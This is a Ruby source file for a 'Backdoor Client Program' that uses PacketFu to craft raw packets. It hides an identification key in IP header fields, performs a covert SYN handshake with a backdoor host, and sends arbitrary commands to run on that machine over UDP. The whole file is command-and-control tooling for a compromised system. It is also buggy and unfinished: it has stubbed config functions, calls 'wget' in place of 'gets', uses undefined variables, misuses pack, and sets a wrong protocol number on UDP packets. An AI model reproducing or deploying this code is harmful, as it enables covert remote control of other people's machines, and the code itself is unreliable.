# client.rb - Connects to a back-door server to issue commands, receive files, and change config
require 'rubygems'
require 'packetfu'
require 'timeout'

include PacketFu

# Define Config File Path
cfgFilePath = "./client-config"

# - - - - Definitions Start
# Load config from file
def loadConfig(path)
	#TODO: Load from file
	$identKey = 12345 # Identifies us to server
	$timeout = 5
	iName = "lo" # Our interface name
	$dstIP = "127.0.0.1"
	$srcIP = "127.0.0.1"
	$cmdPort = "80" # TCP goes here
	cmdField = "seq-number" # Options: seq-number,ack-number
	$dataPort = "2289" # UDP goes here
	dataCmdField = "src-port" # Options: src-port, dst-port
	userCmdRun = "20" # Identifies a run command
	#config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> "wlan0")).config # set interface
    $config = PacketFu::Config.new(:iface=> iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)
end

#Construct TCP Packet
def tcpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,flags, payload)
	#--> Build TCP/IP
    
    #- Build Ethernet header:---------------------------------------
    pkt = PacketFu::TCPPacket.new(:config => $config , :flavor => "Linux")
	# pkt.eth_src = "00:11:22:33:44:55" # Ether header: Source MAC ; you can use: pkt.eth_header.eth_src
	# pkt.eth_dst = "FF:FF:FF:FF:FF:FF" # Ether header: Destination MAC ; you can use: pkt.eth_header.eth_dst
    pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    pkt.ip_id = identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 6	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_saddr = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_daddr = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- TCP header:---------------------------------------
    pkt.payload = payload	# TCP header: packet header(body)
    pkt.tcp_flags.ack = flags[0]	# TCP header: Acknowledgment
    pkt.tcp_flags.fin = flags[1]	# TCP header: Finish
    pkt.tcp_flags.psh = flags[2]	# TCP header: Push
    pkt.tcp_flags.rst = flags[3]	# TCP header: Reset
    pkt.tcp_flags.syn = flags[4]	# TCP header: Synchronize sequence numbers
    pkt.tcp_flags.urg = flags[5]	# TCP header: Urgent pointer
    pkt.tcp_ecn = 0	# TCP header: ECHO
    pkt.tcp_win	= 8192	# TCP header: Window
    pkt.tcp_hlen = 5	# TCP header: header length
    pkt.tcp_src = srcPort	# TCP header: Source Port (random is the default )
    pkt.tcp_dst = dstPort	# TCP header: Destination Port (make it random/range for general scanning)
    pkt.recalc	# Recalculate/re-build whole pkt (should be at the end)
    return pkt
end

def udpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,payload)
	pkt = PacketFu::UDPPacket.new(:config => $config , :flavor => "Linux")
	pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    pkt.ip_id = identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 6	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_saddr = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_daddr = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- UDP header:---------------------------------------
    pkt.payload = payload
    pkt.udp_src = srcPort
    pkt.udp_dst = dstPort
    return pkt
end

def loadMenu(page)
	if page == "start"
		$status    = "Disconnected"
		$menuTitle = "Start Menu - Connect to the Backdoor, or change Config."
		$menuItems = ["0 - Update Configuration", "1 - Connect to Backdoor", "2 - Ping Backdoor"]
		$prompt    = "Please make a selection: "
	end
	if page == "updateConfig"
		$status    = "Disconnected"
		$menuTitle = "Update Config - Review and Update Settings\nChange a setting by entering <num> <new value>\n"
		$menuItems = ["0 - Backdoor IP (Current Value: #{dstIP})", "1 - Command Port (Current Value: #{cmdPort})", 
			"2 - Data Port (Current Value: #{dataPort}", "3 - Secret Key (Current Value: #{identKey})"]
		$prompt     = "Update any variable: "
	end
	if page == "connected"
		$status    = "Connected"
		$menuTitle = "Main Menu - Communicate with Backdoor"
		$menuItems = ["0 - Run A Command", "1 - Download A File"]
		$prompt    = "Please make a selection: "
	end
	if page == "run"
		$status    = "Connected"
		$menuTitle = "Run A Command - Run any command on the Backdoor machine."
		$menuItems = []
		$prompt    = "Enter Command: "
	end
end

# Display Menu
def displayMenu(page,msg)
	loadMenu(page)
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	print "* * * * * * * Backdoor Client Program * * * * * * *\n"
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	print "* * * Status:       #{$status}\n"
	print "* * * Backdoor IP:  #{$dstIP}\n"
	print "* * * Command Port: #{$cmdPort}\n"
	print "* * * Data Port:    #{$dataPort}\n"
	print "* * * * * * * * * * * * * * * * * * * * * * * * * *\n"
	if msg.length > 0
		print "-- #{msg} --\n"
	end
	print "#{$menuTitle}\n"
	i=0
	while i < $menuItems.length do
		print "#{$menuItems[i]}\n"
		i = i + 1
	end
	print $prompt
end

# Add integer check to String class
class String
  def is_integer?
    self.to_i.to_s == self
  end
end

# Validate User Input
def validateUserInput(page, input)
	if page == "start"
		num = input[0,1]
		if num.is_integer? && num.to_i <= 3
			return true
		else
			displayMenu("start","Error: Invalid Selection")
			return false
		end
	end
	if page == "updateConfig"
		num = input[0,1]
		if num.is_integer? && num.to_i <= 4
			newVal = input.split(" ")[1]
			if !newVal.nil? && newVal.length <= 0
				displayMenu("updateConfig","Error: No Value Specified")
				return false
			end
			return true
		else
			displayMenu("updateConfig","Error: Invalid Selection")
			return false
		end
	end
	if page == "connected"
		num = input[0,1]
		if num.is_integer? && num.to_i <= 2
			return true
		else
			displayMenu("connected","Error: Invalid Selection")
			return false
		end
	end
	if page == "run"
		if input.length <= 0
			displayMenu("run","Error: Missing Command")
			return false
		end
		return true
	end
end

# Update Config File
def updateConfigFile(path, field, value)
	# TODO: Update fields to File
end

# Establish Session with Backdoor
def establishSession(identKey,srcIP,srcPort,dstIP,dstPort,config)
	# Send SYN
	flags = [0,0,0,0,1,0]
	payload = ""
	tcpPacket = tcpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,flags, payload)
	tcpPacket.to_w # Sent
	print "Session request sent, waiting for reply."
	# Wait for Response
	
		status = Timeout::timeout($timeout) {
			capturedTCP = PacketFu::Capture.new(:iface => config[:iface], :start => true, :promisc => true, :filter => "tcp and src host #{dstIP}")
			capturedTCP.stream.each { |packet|
				pkt = Packet.parse packet
				# Check that it is a UDP packet
				if pkt.is_tcp?
					# Is it one of ours?
					if pkt.ip_id == identKey
						# Should be a SYN/ACK to Confirm Session
						if pkt.tcp_syn == 1 && pkt.tcp_ack == 1
							return true
						end
					end
				end
			}
		}
		rescue Timeout::Error
				print "Error: No Response before Timout\n"
		
end

# Send Data
def sendData(identKey,srcIP,dstIP,dataCmdField,input)
	payload = input.length.pack("h*") + input.pack("h*")
	if dataCmdField == "src-port" # Where do we embed the cmd code?
		dstPort = Random.rand(65535)
		udpPacket = udpConstruct(identKey,srcIP,"20",dstIP,dstPort,payload)
		udpPacket.to_w # Sent
	elsif dataCmdField == "dst-port"
		srcPort = Random.rand(65535)
		udpPacket = udpConstruct(identKey,srcIP,srcPort,dstIP,"20",payload)
		udpPacket.to_w # Sent
	end
	print "Data Sent\n"
end
# - - - - End Functions

# Start Main
while true do
	# Get config from file
	loadConfig(cfgFilePath)

	# Display Start Page
	displayMenu("start","")

	# Get user input
	input = gets
	# Validate user input
	validInput = validateUserInput("start",input)
	if validInput
		num = input[0,1] # Option Number
		if num == "0" # Update Configuration
			while true do
				displayMenu("updateConfig","")
				input = gets
				validInput = validateUserInput("updateConfig",input)
				if validInput
					num = input[0,1] # Option Number
					if num == "0" # Update Backdoor IP
						updateConfigFile(cfgFilePath, "dstIP",input.split(" ")[1])
						redo
					elsif num == "1" # Update Command Port
						updateConfigFile(cfgFilePath, "cmdPort",input.split(" ")[1])
						redo
					elsif num == "2"
						updateConfigFile(cfgFilePath, "dataPort", input.split(" ")[1])
						redo
					elsif num == "3"
						updateConfigFile(cfgFilePath, "identKey", input.split(" ")[1])
						redo
					end
				end
			end
		end
		if num == "1" # Connect To Backdoor
			# Establish Session with Backdoor
			gotSession = establishSession($identKey,$srcIP,$srcPort,$dstIP,$dstPort,$config)
			if gotSession
				# Display Connected Page
				while true do
					displayMenu("connected", "You are now connected to #{dstIP}")
					input = gets
					# Validate user input
					validInput = validateUserInput("start",input)
					if validInput
						num = input[0,1] # Option Number
						if num == "0" # Run a Command
							displayMenu("run")
							input = wget
							sendData(identKey,srcIP,dstIP,dataCmdField,input) # Sent
							# Wait for Response
							status = Timeout::timeout(timeout) {
								capturedTCP = PacketFu::Capture.new(:iface => config[:iface], :start => true, :promisc => true, :filter => "udp and src host #{dstIP}")
								capturedTCP.stream.each { |packet|
									pkt = Packet.parse packet
									# Print the response data
									print "Response: #{pkt.payload}"
									
								}
								
							}
						end
					end
				end
			else
				# Session Failed, return to main menu
				redo
			end
		end
	end
end
# End Main
